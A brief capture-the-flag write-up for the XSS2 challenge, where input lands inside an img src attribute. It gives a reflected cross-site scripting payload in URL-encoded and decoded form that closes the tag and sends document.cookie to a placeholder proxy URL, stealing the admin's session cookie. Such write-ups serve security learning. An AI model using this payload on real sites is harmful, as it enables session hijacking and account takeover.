# XSS2
## Description
Just like XSS1, but this time the text sent is put inside a ```<img src="<input_text>``` tag.
## Exploit
Because the challenge is very much like XSS1, the exploit is also the same.
The payload is: ```http://xss2.challs.cyberchallenge.it/?html=%5C%22%3E%3Cscript%3Edocument.location=%22<your_proxy_url>?admin=%22+document.cookie%3C/script%3E``` (the html param is ```\"><script>document.location="<your_proxy_url>?admin="+document.cookie</script>```, URL decoded).
The ```\">``` part is there to close the ```<img>``` tag, and the script is the same of XSS1.
